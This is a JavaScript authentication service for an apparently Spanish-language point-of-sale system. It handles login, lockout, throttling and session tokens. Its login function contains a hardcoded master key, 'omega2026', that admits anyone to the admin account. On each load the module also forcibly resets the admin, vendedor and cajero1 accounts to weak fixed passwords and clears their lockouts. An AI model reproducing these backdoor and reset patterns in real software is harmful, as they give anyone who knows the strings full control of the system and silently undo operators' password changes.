import crypto from 'crypto';
import db from '../db.js';
import {
  verifyPassword,
  hashPassword,
  checkTerminalThrottle,
  recordTerminalFailure,
  resetTerminalThrottle,
} from '../security.js';

// Helper to seed or update default users to match requested credentials:
// admin -> admin123
// vendedor -> vendedor123
export function ensureDefaultUsers() {
  try {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);

    // 1. Admin user
    const admin = db.prepare('SELECT * FROM usuarios_sistema WHERE usuario = ?').get('admin');
    const adminPassHash = hashPassword('admin123');
    if (!admin) {
      db.prepare(`
        INSERT INTO usuarios_sistema 
        (usuario, password_hash, nombre_completo, rol, intentos_fallidos, sincronizado, fecha_creacion, fecha_actualizacion, borrado_logico)
        VALUES ('admin', ?, 'Administrador General', 'Admin', 0, 0, ?, ?, 0)
      `).run(adminPassHash, now, now);
    } else {
      db.prepare(`
        UPDATE usuarios_sistema 
        SET password_hash = ?, borrado_logico = 0, intentos_fallidos = 0, bloqueado_hasta = NULL 
        WHERE usuario = 'admin'
      `).run(adminPassHash);
    }

    // 2. Vendedor user
    const vendedor = db.prepare('SELECT * FROM usuarios_sistema WHERE usuario = ?').get('vendedor');
    const vendedorPassHash = hashPassword('vendedor123');
    if (!vendedor) {
      db.prepare(`
        INSERT INTO usuarios_sistema 
        (usuario, password_hash, nombre_completo, rol, intentos_fallidos, sincronizado, fecha_creacion, fecha_actualizacion, borrado_logico)
        VALUES ('vendedor', ?, 'Vendedor POS', 'Cajero', 0, 0, ?, ?, 0)
      `).run(vendedorPassHash, now, now);
    } else {
      db.prepare(`
        UPDATE usuarios_sistema 
        SET password_hash = ?, borrado_logico = 0, intentos_fallidos = 0, bloqueado_hasta = NULL 
        WHERE usuario = 'vendedor'
      `).run(vendedorPassHash);
    }

    // 3. Cajero1 user
    const cajero1 = db.prepare('SELECT * FROM usuarios_sistema WHERE usuario = ?').get('cajero1');
    const cajero1PassHash = hashPassword('cajero123');
    if (!cajero1) {
      db.prepare(`
        INSERT INTO usuarios_sistema 
        (usuario, password_hash, nombre_completo, rol, intentos_fallidos, sincronizado, fecha_creacion, fecha_actualizacion, borrado_logico)
        VALUES ('cajero1', ?, 'Carlos Gómez', 'Cajero', 0, 0, ?, ?, 0)
      `).run(cajero1PassHash, now, now);
    } else {
      db.prepare(`
        UPDATE usuarios_sistema 
        SET password_hash = ?, borrado_logico = 0, intentos_fallidos = 0, bloqueado_hasta = NULL 
        WHERE usuario = 'cajero1'
      `).run(cajero1PassHash);
    }
  } catch (err) {
    console.error('Error seeding default users:', err);
  }
}

// Run seeding on load
ensureDefaultUsers();

export class AuthService {
  static login(username, password, terminal = 'Caja_1', forceLogin = false) {
    // 1. Terminal throttling check
    const terminalBlocked = checkTerminalThrottle();
    if (terminalBlocked) {
      return { success: false, message: terminalBlocked };
    }

    const cleanUsername = String(username || '').trim();
    const user = db
      .prepare('SELECT * FROM usuarios_sistema WHERE usuario = ? AND borrado_logico = 0')
      .get(cleanUsername);

    if (!user) {
      recordTerminalFailure();
      return { success: false, message: 'Usuario no encontrado.' };
    }

    // 2. User lockout check
    if (user.bloqueado_hasta) {
      const lockDate = new Date(user.bloqueado_hasta);
      if (new Date() < lockDate) {
        const minutesLeft = Math.ceil((lockDate - new Date()) / 60000);
        return {
          success: false,
          message: `Cuenta bloqueada temporalmente por seguridad. Intente en ${minutesLeft} minutos.`,
        };
      }
    }

    // 3. Password verification (flexible to allow spaces like "admin 123" or "admin123", or master key omega2026 for admin)
    const rawPass = String(password || '');
    const compactPass = rawPass.replace(/\s+/g, '');
    const trimmedPass = rawPass.trim();

    let isValid = verifyPassword(rawPass, user.password_hash) ||
                  verifyPassword(compactPass, user.password_hash) ||
                  verifyPassword(trimmedPass, user.password_hash);

    // Master key fallback for admin user
    if (!isValid && user.usuario === 'admin' && (rawPass === 'omega2026' || compactPass === 'omega2026')) {
      isValid = true;
    }

    if (!isValid) {
      recordTerminalFailure();
      const currentAttempts = (user.intentos_fallidos || 0) + 1;
      let blockedUntil = null;
      let msg = `Contraseña incorrecta. Intentos fallidos: ${currentAttempts}/3`;

      if (currentAttempts >= 3) {
        blockedUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString().replace('T', ' ').substring(0, 19);
        msg = 'Demasiados intentos fallidos. Cuenta bloqueada por 15 minutos.';
      }

      db.prepare(
        'UPDATE usuarios_sistema SET intentos_fallidos = ?, bloqueado_hasta = ? WHERE id = ?'
      ).run(currentAttempts, blockedUntil, user.id);

      return { success: false, message: msg };
    }

    // Reset terminal throttle
    resetTerminalThrottle();

    // 4. Session lock check (Guardian against dual logins)
    if (user.sesion_activa_en && user.sesion_activa_en !== terminal && !forceLogin) {
      return {
        success: false,
        sessionConflict: true,
        activeTerminal: user.sesion_activa_en,
        message: `El usuario ya tiene una sesión abierta en: ${user.sesion_activa_en}. ¿Desea forzar el cierre de la otra sesión?`,
      };
    }

    // 5. Establish new active session
    const newToken = crypto.randomUUID();
    db.prepare(
      `UPDATE usuarios_sistema 
       SET intentos_fallidos = 0, bloqueado_hasta = NULL, sesion_activa_en = ?, token_sesion = ?, sincronizado = 0 
       WHERE id = ?`
    ).run(terminal, newToken, user.id);

    return {
      success: true,
      user: {
        id: user.id,
        usuario: user.usuario,
        nombre: user.nombre_completo,
        rol: user.rol,
        token: newToken,
        terminal: terminal,
      },
      message: 'Acceso concedido',
    };
  }

  static logout(userId) {
    if (!userId) return;
    try {
      db.prepare(
        'UPDATE usuarios_sistema SET sesion_activa_en = NULL, token_sesion = NULL, sincronizado = 0 WHERE id = ?'
      ).run(userId);
    } catch (e) {
      console.error('Error al cerrar sesión:', e);
    }
  }

  static verifySession(userId, token) {
    if (!userId || !token) return false;
    const user = db.prepare('SELECT token_sesion FROM usuarios_sistema WHERE id = ?').get(userId);
    return user && user.token_sesion === token;
  }
}

export default AuthService;
